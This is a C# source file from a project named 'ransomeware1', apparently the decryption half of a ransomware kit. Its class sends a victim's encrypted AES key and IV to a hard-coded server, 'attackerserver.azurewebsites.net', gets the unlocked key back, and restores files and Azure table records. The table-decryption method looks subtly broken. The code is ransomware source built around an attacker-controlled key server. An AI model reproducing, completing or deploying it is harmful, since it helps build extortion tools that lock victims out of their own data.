using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using Microsoft.WindowsAzure.Storage;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace ransomeware1
{
    public class AESDecryption
    {

        private AesCryptoServiceProvider myAes;

        private string serverUrl = "https://attackerserver.azurewebsites.net/api/GetKey?code=KQGwkXAqse/rgpCDOk9kcumdgdshobfOd6WhuKOwsqx1Y6BAfeEVXA==";

        // private string debugUrl = "http://localhost:7071/api/GetKey";

        public AESDecryption()
        {
            myAes = new AesCryptoServiceProvider();
        }

        public async Task<bool> retrieveKeyFromServer(byte[] encryptedKey, byte[] encryptedIV)
        {
            HttpClient client = new HttpClient();
            var values = new Dictionary<string, string>
            {
               { "key",  Convert.ToBase64String(encryptedKey)},
               { "iv",   Convert.ToBase64String(encryptedIV)}
            };
            var response = await client.PostAsJsonAsync(serverUrl, values);
            if (!response.IsSuccessStatusCode)
            {
                return false;
            }
            string jsonContent = await response.Content.ReadAsStringAsync();
            dynamic data = JsonConvert.DeserializeObject<object>(jsonContent);
            var dict = JsonConvert.DeserializeObject<Dictionary<string, string>>(data);
            myAes.Key = Convert.FromBase64String(dict["key"]);
            myAes.IV = Convert.FromBase64String(dict["iv"]);
            return true;
        }

        public void decryptAES(string filename, CloudStorageAccount storageAccount)
        {
            ICryptoTransform decryptor = myAes.CreateDecryptor(myAes.Key, myAes.IV);
            using (MemoryStream msDecrypt = new MemoryStream(File.ReadAllBytes(filename)))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                    {
                        string plaintext = srDecrypt.ReadToEnd();
                        //Console.WriteLine(plaintext);
                        File.WriteAllText(filename, plaintext);
                    }
                }
            }
            
        }

        public string TableDecryptAES(string record)
        {
            string plainText = record;

            // Check arguments.
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            byte[]decrypted;
            ICryptoTransform decryptor = myAes.CreateDecryptor(myAes.Key, myAes.IV);
            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, decryptor, CryptoStreamMode.Write))
                {
                    using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                    {
                        //Write all data to the stream.
                        swEncrypt.Write(plainText);
                    }
                    decrypted = msEncrypt.ToArray();

                    return System.Text.Encoding.UTF8.GetString(decrypted);
                }
            }
        }

    }
}
